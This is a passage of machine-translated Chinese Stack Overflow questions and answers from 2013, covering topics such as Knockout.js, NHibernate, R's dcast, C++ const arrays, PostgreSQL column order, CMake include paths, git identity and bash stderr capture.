// on page load
sessionStorage.overlay = 0;

// on click
sessionStorage.overlay = 1;

// time triggers overlay
sessionStorage.overlay = 2; 
```

要检索：

```
if(sessionStorage.overlay < 2){
    // load form magic
} 
```

如果需要，您可以包含一些 if else 逻辑用于 1 与 0，我只是出于示例目的而保持简单。

这将保留在所有刷新中。应该注意的是，这适用于 IE8+ 和所有真正的浏览器……如果你正在为 IE6 兼容性而拍摄，它不会成功。对于那些跛脚的人，您可以编写一个单独的脚本来检测回发。检测浏览器支持：

```
if(window.sessionStorage){
    // do the above code
} else {
    // reference postback script
} 
```

这应该涵盖所有人。

# javascript - Knockout.js 计算

> ID：15392533
> 
> 赞同：0
> 
> 时间：2013-03-13T17:39:20.223
> 
> 标签：javascript, html, knockout.js

我正在使用 Knockout.js 开发一个计算器。我面临着一个我不知道如何处理的情况。在下面的示例中，当用户输入产品和值并将值保存在数据库中时，一切正常。但是当用户来编辑这个页面时，我的要求是显示用户输入的所有值以及总数。但是当用户更改产品或数量的某些内容时，总数应该会按预期发生变化。

我们现在将总数存储在数据库中，并且某些管理员用户可以更改总数。在这种情况下，有没有一种方法可以在用户进入编辑页面时覆盖计算值，但是当用户更改产品或数量时，然后计算应该使用来自产品和数量的最新值。

帮助表示赞赏。

```
var TsFoundationDeviceModel = function(product,qty) {
var self = this;
self.product = ko.observable();
self.quantity= ko.observable();
self.computedExample = ko.computed(function() {
   return self.product() * self.quantity() ;
});} 
```

我的 HTML 代码看起来像

```
<input name="product" data-bind="value:product">
<input name="value" data-bind="value:value">
<input name="total" data-bind="value:computedExample"/> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:55:57.323

当您在计算中引用 observables 时，您需要将它们视为函数，而不是`return self.product * self.quantity ;`使用`return self.product() * self.quantity();`

小提琴：http: [//jsfiddle.net/SAV9A/](http://jsfiddle.net/SAV9A/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:48:28.977

您必须将视图绑定到屏幕。看看这个小提琴并给它

```
 var TsFoundationDeviceModel = function(product,qty) {
var self = this;
self.product = ko.observable(product);
self.quantity= ko.observable(qty);
self.computedExample = ko.computed(function() {
 return self.product() * self.quantity() ;
});}

ko.applyBindings(new TsFoundationDeviceModel(2,3)); 
```

[http://jsfiddle.net/Z6VPV/5/](http://jsfiddle.net/Z6VPV/5/)

# python - Python在Ubuntu上获取机器的局域网IP地址

> ID：15392544
> 
> 赞同：5
> 
> 时间：2013-03-13T17:39:53.757
> 
> 标签：python, ubuntu, network-programming

因此，我正在尝试获取程序正在运行的机器的 LAN IP 地址，并将其与通过 UDP 传递给它的 IP 地址进行比较。

但是，当我使用：

```
print str(socket.gethostbyname(socket.gethostname())) 
```

它返回 127.0.0.1，应该是 192.168.1.9。

我查看了 linux 机器及其获取 lo（loopBack）端口的 IP 地址？我不知道那是什么，但它应该获取 eth0 的 IP 地址。

我发现我可以对 bash 命令“ifconfig eth0”进行子处理，但这会返回一大块字符串。我可以将它处理成我需要的东西，但这将在 beaglebone 上每秒运行大约 3 次，所以我希望它更高效一些。

有没有更优雅的方式来做到这一点？

我可以更改 gethostname 的目标吗？

为什么它针对 lo 端口？

感谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:53:20.243

尝试返回机器的完全限定域名：

```
print str(socket.gethostbyname(socket.getfqdn())) 
```

`/etc/hosts`可能有一个条目将主机名解析为`127.0.0.1`，这就是为什么`socket.gethostbyname()`不返回您所期望的。

[原始问题在这里](https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib)提出并回答，但`socket.getfqdn()`解决方案并没有一目了然。如果您决定走这条路，这是解析输出的[解决方案。](https://stackoverflow.com/a/3177266/366335)`ifconfig`标准库似乎足以解决您的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:49:56.277

[netifaces](http://alastairs-place.net/projects/netifaces/)似乎是一个非常可爱的 python 模块，应该可以为您解决问题。

# c# - 使用惰性属性时，NHibernate 3.2 对象在刷新期间不会更新

> ID：15392545
> 
> 赞同：3
> 
> 时间：2013-03-13T17:39:55.743
> 
> 标签：c#, nhibernate, fluent-nhibernate

我在我的实体中使用了lazyload 属性。它工作正常，但是当通过方法更改此类中的任何属性时，NHibernate 不会进行更新。如果直接更改属性，则一切正常。

我想如果返回惰性属性代理对象并且该代理不处理内部更改，则存在该问题。

我在下面添加了测试代码。它在 NHibernate 3.1 中运行良好，但在 NHibernate 3.2 和 3.3 中不调用更新

也许有人知道如何解决这个问题？

谢谢。

实体：

```
/// <summary>
/// Class for testing lazy properties.
/// </summary>
public class TestClass
{
    public virtual int Id { get; set; }
    public virtual string LazyData { get; set; }
    public virtual string TestData { get; set; }

    public virtual void ChangeTestData(string data)
    {
        TestData = data;
    }
} 
```

映射：

```
public class TestClassMap : ClassMap<TestClass>
{
    public TestClassMap()
    {
        Id(m => m.Id);
        Map(m => m.LazyData).LazyLoad();
        Map(m => m.TestData);
    }
} 
```

测试代码：

```
[Test]
public void LazyProperityTest1()
{
    var testObj = new TestClass();
    Session.Save(testObj);
    Session.Flush();
    Session.Clear();

    // Change property and flush session.
    var persistedObj = Session.CreateCriteria<TestClass>().List<TestClass>().First();
    persistedObj.ChangeTestData("test");

    Session.Flush();
    Session.Clear();
} 
```

设置 LazyLoad 时生成的 sql 请求：

```
NHibernate: INSERT INTO "TestClass" (LazyData, TestData) VALUES (@p0, @p1); select last_insert_rowid();@p0 = NULL [Type: String (0)], @p1 = NULL [Type: String (0)]
NHibernate: SELECT this_.Id as Id0_0_, this_.TestData as TestData0_0_ FROM "TestClass" this_ 
```

未设置 LazyLoad 时生成的 sql 请求：

```
NHibernate: INSERT INTO "TestClass" (LazyData, TestData) VALUES (@p0, @p1); select last_insert_rowid();@p0 = NULL [Type: String (0)], @p1 = NULL [Type: String (0)]
NHibernate: SELECT this_.Id as Id0_0_, this_.LazyData as LazyData0_0_, this_.TestData as TestData0_0_ FROM "TestClass" this_
NHibernate: UPDATE "TestClass" SET LazyData = @p0, TestData = @p1 WHERE Id = @p2;@p0 = NULL [Type: String (0)], @p1 = 'test' [Type: String (0)], @p2 = 1 [Type: Int32 (0)] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T12:41:30.420

这对我来说绝对是一个错误，你有一个很好的测试用例来证明它。

[请在https://nhibernate.jira.com/](https://nhibernate.jira.com/)输入问题

# android - 如何将实时、不断更新的数据从 REST API 发送到移动应用程序？

> ID：15392547
> 
> 赞同：4
> 
> 时间：2013-03-13T17:39:59.920
> 
> 标签：android, ios, rest, mobile, real-time

将不断更新的数据从服务器（通过 REST API 或套接字）发送到 iOS 或 Android 应用程序的最佳方式是什么？我应该创建一个套接字连接并拥有一个输出数据的套接字服务器，还是应该让应用程序定期轮询后端资源？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:48:03.423

> 我是否应该创建一个套接字连接并拥有一个抽出数据的套接字服务器

这是一个选项。我知道 Play 商店中的一些顶级应用程序使用 Web 套接字来传输数据。

> 让应用定期轮询后端资源

我建议不要这样做。轮询会耗尽电池电量。android 操作系统有时会让 CPU 处于空闲模式，并且不断的轮询可以唤醒 CPU 并导致电池耗尽。用户不会喜欢这样的。当服务器没有结果时，您也在浪费处理能力。

向安卓手机发送推送通知/次要更新的最简单方法是通过 GCM。GCM 消息几乎是实时传递的（我注意到我的应用程序延迟了大约一秒）。有效负载限制为 4k，消息最多可存储 4 周。这是您可以根据您的用例考虑的另一个选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:45:45.027

我遵循的典型模型是按指定的时间间隔访问服务器并下载更新的数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-07-22T11:18:04.197

*   轮询很糟糕，它会耗尽电池
*   如果要在应用程序处于前台时更新屏幕，最好使用 Socket Connection。您可以实时看到变化。

为此，您需要创建一个套接字服务器并打开设备和服务器之间的连接。 [https://www.raywenderlich.com/3437391-real-time-communication-with-streams-tutorial-for-ios](https://www.raywenderlich.com/3437391-real-time-communication-with-streams-tutorial-for-ios)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-07-22T15:24:38.803

我将从几个小时前发布的类似问题中粘贴我接受的答案。

它可以使用套接字或轮询服务器来完成，但我不推荐用于生产级应用程序。您最终将需要安全功能，*作为前端开发人员*，很难从头开始。

我建议使用第三方服务。看看[空间云](https://github.com/spaceuptech/space-cloud)。它是 Firebase 的开源替代品，您可以在其中使用自己的数据库并内置安全功能。如果您想更深入，它使用[Apache Kafka](https://kafka.apache.org/)来实现实时数据库功能。

如果这些不适合您，那么最好的选择是使用 GCM。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-07-22T18:49:12.560

通常，您会希望您的服务器将更新推送到客户端，因为轮询成本高昂，可能无法与*N*数量的客户端很好地扩展，并且会更快地耗尽您的手机电池。根据您的服务器技术：

**.NET/Core**：可能想看看[SignalR](https://docs.microsoft.com/en-us/aspnet/signalr/overview/getting-started/introduction-to-signalr)将通知从后端推送到您的客户端应用程序。

**Java**：可能想看看[Atmosphere](https://github.com/Atmosphere/atmosphere)将通知从后端推送到您的客户端应用程序。

我使用 SignalR 向电话客户端发布了良好的结果。没用过Atmosphere，但评价不错。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-07-16T09:32:49.960

我建议使用 MQTT 协议来发布和订阅数据。用于集成 MQTT 协议的 iOS（Moscapsule）和 Android（Paho）库可用，并且可以轻松集成到移动应用程序中。后端也需要配置为支持 MQTT。可以在[此处](https://randomnerdtutorials.com/what-is-mqtt-and-how-it-works/)找到有关 MQTT 如何工作的详细信息。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-07-22T18:21:05.283

> 我应该让应用程序定期轮询后端资源吗？

这必须是最后考虑的选择。只要客户端数量增加，您就需要扩展后端/服务器，这并不像在现有服务器旁边放置另一台服务器那么简单。

完美的解决方案将是面向推送的设计，最好的方法是将客户端注册到事件，如果发生特定事件，服务器将推送客户端。

您需要更具体地了解您的业务案例。您在问题中提到了实时，但那是什么实时。它是视频流、聊天应用程序还是普通的休息电话？

# c# - 将多个元素值绑定到视图模型中的单个属性

> ID：15392548
> 
> 赞同：0
> 
> 时间：2013-03-13T17:40:03.297
> 
> 标签：c#, wpf

如何将多个控件值绑定到我的视图模型中的单个属性

**无效代码：**

```
 <MultiBinding Converter="{StaticResource myMultiConverter}">
            <!--Convert From these element-->
            <From ElementName="check1" Path="IsChecked" />
            <From ElementName="check2" Path="IsChecked" />
            <From ElementName="check3" Path="IsChecked" />
            <From ElementName="check4" Path="IsChecked" />
            <!--To Viewmodel Property-->
            <To ElementName="myViewModelProperty" />
        </MultiBinding>

        <CheckBox Name="check1"></CheckBox>
        <CheckBox Name="check2"></CheckBox>
        <CheckBox Name="check3"></CheckBox>
        <CheckBox Name="check4"></CheckBox> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:46:10.757

像往常一样绑定属性

```
<CheckBox Name="check1" IsChecked="{Binding Path=myViewModelProperty}" />
<CheckBox Name="check2" IsChecked="{Binding Path=myViewModelProperty}" />
<CheckBox Name="check3" IsChecked="{Binding Path=myViewModelProperty}" />
<CheckBox Name="check4" IsChecked="{Binding Path=myViewModelProperty}" /> 
```

然后，在 ViewModel 中：

```
 public Boolean myViewModelProperty
    {
        get {  ...       }

        set {  ...       }
    } 
```

同样在 ViewModel 中，需要时：

```
this.RaisePropertyChanged<Boolean>(() => this.myViewModelProperty); 
```

如果需要，您可以在一个属性上绑定尽可能多的元素值（即使我不理解具有相同属性的 4 个复选框^^）

MultiBinding 用于将一个元素值绑定到许多 ViewModel 属性。

**编辑**：考虑到必须将 4 个复选框转换为枚举的事实：

```
<CheckBox Name="check1" IsChecked="{Binding Path=myViewModelProperty1}" />
<CheckBox Name="check2" IsChecked="{Binding Path=myViewModelProperty2}" />
<CheckBox Name="check3" IsChecked="{Binding Path=myViewModelProperty3}" />
<CheckBox Name="check4" IsChecked="{Binding Path=myViewModelProperty4}" />

    public Boolean myViewModelProperty1
    {
        get 
        { 
            return this.b1;  
        }
        set 
        { 
            this.b1  =value;
            this.EvaluateMyEnum();
        }
    }

    public Boolean myViewModelProperty2
    {
        get 
        { 
            return this.b2;  
        }
        set 
        { 
            this.b2  =value;
            this.EvaluateMyEnum();
        }
    }

    public Boolean myViewModelProperty3
    {
        get 
        { 
            return this.b2;  
        }
        set 
        { 
            this.b2  =value;
            this.EvaluateMyEnum();
        }
    }

    public Boolean myViewModelProperty4
    {
        get 
        { 
            return this.b4;  
        }
        set 
        { 
            this.b4  =value;
            this.EvaluateMyEnum();
        }
    }

    void EvaluateMyEnum()
    {
        this.MyViewModelEnum = ......;
        this.RaisePropertyChanged<MyEnum>(() => this.myViewModelEnum);
    } 
```

# r - 不知道为什么 dcast() 这个数据集会导致删除变量

> ID：15392550
> 
> 赞同：1
> 
> 时间：2013-03-13T17:40:14.597
> 
> 标签：r, plyr, reshape, chord-diagram

我有一个看起来像这样的数据框：

```
 id fromuserid touserid from_country to_country length
1   1   54525953 47195889           US         US      2
2   2   54525953 54361607           US         US      1
3   3   54525953 53571081           US         US      2
4   4   41943048 55379244           US         US      1
5   5   47185938 53140304           US         PR      1
6   6   47185938 54121387           US         US      1
7   7   54525974 50928645           GB         GB      1
8   8   54525974 53495302           GB         GB      1
9   9   51380247 45214216           SG         SG      2
10 10   51380247 43972484           SG         US      2 
```

每行描述从一个用户发送给另一个用户的消息数量（长度）。

我想做的是创建每个国家之间发送的消息的可视化（通过 D3 中的和弦图）。

有近200个国家。我使用函数 dcast 如下：

```
countries <- dcast(chats,from_country ~ to_country,drop=FALSE,fill=0) 
```

当我有一个较小的数据集和较少的变量时，这对我有用，但是这个数据集超过 3M 行，并且不容易调试，可以这么说。

无论如何，我现在得到的是一个不是正方形的矩阵，我不知道为什么不。我期望得到的本质上是一个矩阵，其中`(i,j)th`单元格代表从`country i`to发送的消息`country j`。我最终得到的结果与此非常接近，但显然缺少一些行和列，这很容易发现，因为 US->US 消息显示移动了一行或一列。

所以这是我的问题。有什么我正在做的事情显然是错误的吗？如果没有，我应该在数据集中寻找一些“奇怪”的东西来解决这个问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:52:27.920

确保您的“from_country”和“to_country”变量是因子，并且它们共享相同的级别。使用您共享的示例数据：

```
chats$from_country <- factor(chats$from_country, 
                             levels = unique(c(chats$from_country, 
                                               chats$to_country)))
chats$to_country <- factor(chats$to_country, 
                           levels = levels(chats$from_country))
dcast(chats,from_country ~ to_country, drop = FALSE, fill = 0)
# Using length as value column: use value.var to override.
# Aggregation function missing: defaulting to length
#   from_country US GB SG PR
# 1           US  5  0  0  1
# 2           GB  0  2  0  0
# 3           SG  1  0  1  0
# 4           PR  0  0  0  0 
```

如果您的“from_country”和“to_country”变量已经是因素，但不是相同的级别，您可以在第一步中执行以下操作：

```
chats$from_country <- factor(chats$from_country, 
                             levels = unique(c(levels(chats$from_country), 
                                               levels(chats$to_country))) 
```

为什么这是必要的？如果它们*已经是*因子，则将`c(chats$from_country, chats$to_country)`因子强制为数字，并且由于与因子的任何字符值都不匹配，因此将导致`<NA>`.

# c++ - 为什么常量 POD 对象常量本身的字段不是？

> ID：15392553
> 
> 赞同：3
> 
> 时间：2013-03-13T17:40:23.430
> 
> 标签：c++, templates

我想专门为某个 GUID 设计一个模板，它是一个 16 字节的结构。GUID 对象有内部链接，所以我不能使用对象本身的地址，但我认为我可以使用对象的内容，因为对象是一个常量。但这不起作用，如此示例代码所示：

```
struct S
{
    int const i;
};
S const s = { 42 };
char arr[s.i]; 
```

如果 s 是常数，为什么 si 不是常数？任何解决方法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-13T17:47:06.540

结构的初始化`s`可以在运行时发生。但是，数组的大小*必须*在编译时知道。编译器不会（肯定）知道 的值`s.i`在编译时是已知的，所以它只是看到你正在使用一个你不应该使用的变量。问题不在于常量，而是何时需要数组大小的问题。

你可能误解了什么`const`意思。这只意味着变量初始化后，永远不会改变。例如这是合法的：

```
void func(int x){
    const int i = x*5; //can't be known at compile-time, but still const
    //int array[i]; //<-- this would be illegal even though i is const 
}

int main(){
    int i;
    std::cin >> i;
    func(i);
    return 0;
} 
```

* * *

为了绕过这个限制，在 C++11 中，您可以将其标记为`constexpr`指示该值可以在编译时确定。这似乎是你想要的。

```
struct S
{
    int const i;
};
int main(){
    constexpr S const s = { 42 };
    char arr[s.i];
    return 0;
} 
```

编译：

`$ c++ -std=c++11 -pedantic file.cpp`

* * *

在 C99 中，您所做的是合法的，数组的大小不需要在编译时知道。

```
struct S
{
    int const i;
};
int main(){
    struct S const s = { 42 };
    char arr[s.i];
    return 0;
} 
```

编译：

`$ cc -std=c99 -pedantic file.c`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:52:29.750

至少在大多数情况下，`const`实际上意味着更接近“只读”而不是“常量”。在 C89/90 中，它基本上意味着“只读”。C++ 增加了一些它可以保持不变的情况，但它仍然没有接近所有时间（不幸的是，在不平凡的情况下准确跟踪它的含义）。

幸运的是，“解决方法”是以几乎可以肯定在任何情况下都应该的方式编写代码：

```
std::vector<char> arr(s.i); 
```

底线：C++ 中内置数组的*大多数使用都应该被认为是可疑的。*您可以从非常量表达式初始化向量这一事实只是*众多*优势之一。

# php - 从两个不同的服务器检索时，PHP 中的不同 PostgreSQL 字段顺序

> ID：15392556
> 
> 赞同：0
> 
> 时间：2013-03-13T17:40:30.800
> 
> 标签：php, codeigniter, postgresql

我正在使用 CodeIgniter 2.1.3 和 PHP 5.4.8，以及两个 PostgreSQL 服务器（P1 和 P2）。

我`list_fields()`在 CodeIgniter 中遇到了函数问题。当我从 P1 服务器检索字段时，字段按照我最初创建表的顺序排列。但是，如果我使用完全相同的代码从 P2 服务器检索字段，则字段顺序相反。

如果 P1 的字段是`array('id', 'name', 'age')`,

P2 的字段变为`array('age', 'name', 'id')`

我不认为这是 CodeIgniter 特定的问题，而是一般的数据库配置或 PHP 问题，因为代码是相同的。

这是我获取字段的代码。

```
$fields = $this->db->list_fields("clients"); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T03:14:54.337

我必须澄清一些事情。[@muistooshort 在上面的评论中声称](https://stackoverflow.com/questions/15392556/different-postgresql-fields-orders-in-php-when-retrieved-from-two-different-serv/15411184#comment21759598_15392556)：

> 从技术上讲，表中的列没有定义的顺序。

@mu 可能正在考虑**order 或 rows**，没有`ORDER BY`.

**列的顺序**是完全不正确的，它在列中**定义**并存储[`pg_attribute.attnum`](http://www.postgresql.org/docs/current/interactive/catalog-pg-attribute.html)。它用于许多地方，例如`INSERT`没有列定义列表或`SELECT *`. 它通过转储/恢复周期进行保存，并且[对存储大小和性能有重要影响](https://stackoverflow.com/questions/12604744/does-the-order-of-columns-in-a-postgres-table-impact-performance)。

您不能简单地更改 PostgreSQL 中列的顺序，因为它还没有实现。它与系统紧密相连，很难改变。有一个[Postgres Wiki 页面](http://wiki.postgresql.org/wiki/Alter_column_position)，它[位于项目的 TODO 列表中](http://wiki.postgresql.org/wiki/Todo)：

> 通过记录每列的显示、存储和永久 id 来允许列显示重新排序？

找出你的桌子：

```
SELECT attname, attnum
FROM   pg_attribute 
WHERE  attrelid = 'myschema.mytable'::regclass
AND    NOT attisdropped  -- no dropped (dead) columns
AND    attnum > 0        -- no system columns
ORDER  BY attnum; 
```

`SELECT *`在*某些情况下*使用是不明智的，因为基础表的列可能会更改并破坏您的代码。在需要所有列（默认顺序）的*其他上下文*中使用是*明确明智的。*`SELECT *`

 *### 至于首要问题

这不应该发生。`SELECT *`在 PostgreSQL 中以明确定义的顺序返回列。有些中间件一定在惹你生气。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T13:50:51.697

我怀疑您已经习惯了 MySQL，它允许您在创建表后重新排序列。PostgreSQL 不允许你这样做，所以当你：

```
ALTER TABLE foo ADD bar int; 
```

**它总是**把它放在桌子的最后，没有*办法*改变顺序。

在 PostgreSQL 上，您不应该假设列的顺序是有意义的，因为根据列的定义顺序，这些顺序可能因服务器而异。

然而，这些颠倒的事实对我来说很奇怪。

如果您想在 db 上查看预期顺序，请使用：

```
\d foo 
```

来自 psql

如果这些都颠倒了，那么问题就出在数据库创建中（这是我的第一印象）。这是首先要看的。如果这没有显示问题，那么 CodeIgniter 确实有一些奇怪的事情发生。*

# javascript - 圆形选择而不是方形

> ID：15392558
> 
> 赞同：0
> 
> 时间：2013-03-13T17:40:54.837
> 
> 标签：javascript, html, css

我希望我的选择是圆形而不是正方形（悬停时具有比例效果），但边界半径似乎不起作用，我尝试过但没有成功。

[http://robinmastromarino.be/dataviz04/](http://robinmastromarino.be/dataviz04/)就在“Ce que tu auras peut-être un jour ou l'autre...”之后

这是html：

```
<div id="tablerond">    
    <div id="tablerond4"></div>
    <div id="tablerond3"></div>
    <div id="tablerond2"></div>
    <div id="tablerond1"></div>
</div> 
```

这是“tablerond2”的css（它们看起来都一样）

```
#tablerond2 {
width: 438px;
height: 439px;
border-radius: 219px;
background: url(img/tablerond2.png);
position: absolute;
top: 87px;
left: 82px; 
```

# c++ - CMake 包含路径

> ID：15392561
> 
> 赞同：11
> 
> 时间：2013-03-13T17:40:59.440
> 
> 标签：c++, cmake

在 C++ 项目中，我会将头文件作为项目源目录的后代包含在内，而不使用 UNIX 目录快捷方式。或者 .. 。我不确定如何配置 cmake 来使用它。

我有目录结构：

```
Root
|-include
| |- foo.h
|-src
| | foo.cpp 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-13T17:48:33.433

放入root\CMakeList.txt：

```
project(root)
include_directories(${root_SOURCE_DIR}/include)
... 
```

您可以在子项目中的任何地方使用 root_SOURCE_DIR。

有关更多信息，请考虑访问[http://www.cmake.org/Wiki/CMake_Useful_Variables#Variables_not_listed_here](http://www.cmake.org/Wiki/CMake_Useful_Variables#Variables_not_listed_here)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-03-13T17:49:22.933

用于`include_directories( include )`根文件夹中的 CMakeLists.txt。或`include_directories( ${CMAKE_SOURCE_DIR}/include )`从任何子文件夹。

# python - Matplotlib 的 3D Graph 不显示任何内容

> ID：15392565
> 
> 赞同：0
> 
> 时间：2013-03-13T17:41:20.817
> 
> 标签：python, graph, matplotlib

我想用 Matplotlib 制作一个 3D 图表。出现图形窗口，但未显示任何数据。我究竟做错了什么？

```
import numpy as np
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')

x = [0, 10, 20, 40, 100]
y = [1, 4, 8, 60, 200]
z = [4, 5, 6, 7, 8]

ax.plot_surface(x, y, z)

plt.show() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:13:10.887

`plot_surface`需要 2D 输入（[doc](http://matplotlib.org/mpl_toolkits/mplot3d/api.html#mpl_toolkits.mplot3d.axes3d.Axes3D.plot_surface)）。它没有绘制任何东西，因为你没有给它一个有效的表面来绘制。

请参阅此[示例](http://matplotlib.org/examples/mplot3d/subplot3d_demo.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:12:29.200

X、Y 和 Z 需要是**二维数组**：

> 曲面图 Axes3D.plot_surface(X, Y, Z, *args, **kwargs) 创建曲面图。
> 
> 参数说明
> 
> X、Y、Z 数据值作为 2D 数组

但是我不明白其背后的逻辑：查看此[SO 帖子](https://stackoverflow.com/questions/9170838/surface-plots-in-matplotlib)以获取更多信息。

# r - 在“geom_bar”图中设置“geom_hline”的长度

> ID：15392570
> 
> 赞同：3
> 
> 时间：2013-03-13T17:41:37.450
> 
> 标签：r, time, ggplot2, stack

我有一个`geom_bar`情节，我想设置 `geom_hline`.

我有这个数据，

```
set.seed(666)
df <- data.frame(
  date = seq(Sys.Date(), len= 156, by="4 day")[sample(156, 26)],
  IndoorOutdoor = rep(c(-1,1), 13), #Change so there are only 26 rows
  Xmin = sample(90, 26, replace = T),
  Ymin = sample(90, 26, replace = T),
  Zmin = sample(90, 26, replace = T)
)

df$XYZmin <- rowSums(df[,c("Xmin", "Ymin", "Zmin")])*df$IndoorOutdoor
df[,7:9] <- df[,3:5]*df[,2] #Adding the sign to each X/Y/Z
names(df)[7:9] <- paste0(names(df)[3:5],"p") #to differentiate from your X/Y/Z
require(ggplot2)

df.m <- melt(df[,c(1:2,6:9)], measure.vars=c("Xminp", "Yminp", "Zminp"))
df.m$pos <- c(as.Date("2013-04-15"), rep(Sys.Date(), (length(df.m$XYZmin)-1)))
df.m$foo <- 0 
```

然后我尝试像这样绘制它

```
plot.alt <- ggplot(df.m, aes(date, value, fill=variable)) + 
  geom_bar(position="stack", stat="identity", width=0.5) + 
  geom_hline(aes(pos, foo), size = 0.8, colour = "green")
plot.alt 
```

这给出了错误消息，

```
Warning message:
Stacking not well defined when ymin != 0 
```

和情节，

![ddd](../Images/82111016bf4e04968b045724570b4e55.png) 如果我尝试用`pos`as绘制它`as.numeric`，

```
df.m$pos <- as.numeric(df.m$pos) 
```

我得到这个错误，

```
Error: Invalid input: date_trans works with objects of class Date only 
```

如何设置绿线的长度？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T17:52:44.393

您可以替换`geom_hline()`并`geom_segment()`设置`x`值的开始和结束位置。

```
ggplot(df.m, aes(date, value, fill=variable)) + 
  geom_bar(position="stack", stat="identity", width=0.5) +
  geom_segment(aes(x=min(pos),xend=max(pos),y=0,yend=0),colour="green") 
```

# windows-phone-8 - WP8：使用 ApplicationBar 截图

> ID：15392572
> 
> 赞同：3
> 
> 时间：2013-03-13T17:41:47.080
> 
> 标签：windows-phone-8

如何使用 ApplicationBar 截屏？我使用[这个分支的例子](https://stackoverflow.com/questions/5553429/wp7-take-screenshot-from-application)

但是通过这种方法，我无法使用 ApplicationBar 进行屏幕截图

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:24:53.543

The application bar is not a [UIElement](http://msdn.microsoft.com/en-us/library/windowsphone/develop/system.windows.uielement%28v=vs.105%29.aspx), but a system control, and that is why you can't get it on a screenshot using the normal methods.

# git - git commit 和用户身份

> ID：15392575
> 
> 赞同：12
> 
> 时间：2013-03-13T17:41:51.647
> 
> 标签：git

我正在遵循 GIT 的官方指南，实际上我在 2.2.6 段落“提交您的更改”之前，在第 1.5.1 节“身份”当被要求输入类似的命令时

```
git config --global user.name "John Doe" 
```

我错过了 --global 选项，因为我不需要它。现在每次我执行 git commit 时，我都会获得

```
$git commit

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository. 
```

但我不想输入 --global 选项，是否存在另一种方式？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-13T17:44:26.697

如果您只想为该存储库设置它，请运行：

```
git config user.email "you@example.com"
git config user.name "Your Name" 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2018-03-23T18:33:43.173

只需键入您在 GitHub 帐户中的相同名称，相同的字母和字符。

[![GitHub 账户名](../Images/185a5c6642179cbdb03fb47f8662f618.png)](https://i.stack.imgur.com/K5bzx.png)

[![git 用户名](../Images/c7f2890452abdc22bec46337ce791872.png)](https://i.stack.imgur.com/Nph5l.png)

# bash - 进程替换捕获stderr

> ID：15392583
> 
> 赞同：10
> 
> 时间：2013-03-13T17:42:07.373
> 
> 标签：bash, stderr, process-substitution

对于这个问题，我将使用`grep`，因为它的使用文本打印到 stderr：

```
$ grep
Usage: grep [OPTION]... PATTERN [FILE]...
Try `grep --help' for more information. 
```

您可以使用进程替换轻松捕获标准输出：

```
$ read b < <(echo hello world) 
```

然而，stderr 跳过了进程替换并打印到控制台：

```
$ read b < <(grep)
Usage: grep [OPTION]... PATTERN [FILE]...
Try `grep --help' for more information. 
```

我想使用进程替换来捕获标准错误。我现在正在使用这个：

```
$ grep 2> log.txt

$ read b < log.txt 
```

但我希望避免临时文件。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-13T17:45:59.753

将命令的标准错误重定向到标准输出：

```
$ read "b" < <(grep 2>&1)
$ echo "$b"
Usage: grep [OPTION]... PATTERN [FILE]... 
```

尽管将命令的输出保存到 Bash 中的变量的传统方法是使用`$()`：

```
$ b=$(grep 2>&1)
$ echo "$b"
Usage: grep [OPTION]... PATTERN [FILE]...
Try `grep --help' for more information. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-13T15:02:42.860

```
$ grep 2> >(sed 's/e/E/g';) 
```

您可以捕获***grep***的标准输出并将其通过管道传输到***sed***但是，我不知道为什么（也不知道如何避免它）它需要额外的 INTRO 来返回控制并显示提示。

**编辑**：您可以像这样修复这种不匹配：

```
$ grep 2> >(sed 's/e/E/g';); sync 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-17T10:23:56.467

对于整个子shell，更通用的解决方案是使用`exec`重定向其标准错误。

如果不是基于`grep`单个命令的OP示例，而是在子shell中有一系列命令，那么您可以像这样重定向整个子shell的标准错误：

```
b=$(cat <(
    exec 2>&1
    echo "standard output"
    echo "standard error" 1>&2
   ))    

echo $b 
```

它将标准输出和标准错误的输出放入变量中`$b`：

```
standard output standard error 
```

这些`echo`语句只是向每个标准输出和标准错误输出一些内容的示例。

# c# - 在c#中处理特殊字符

> ID：15392584
> 
> 赞同：0
> 
> 时间：2013-03-13T17:42:08.637
> 
> 标签：c#

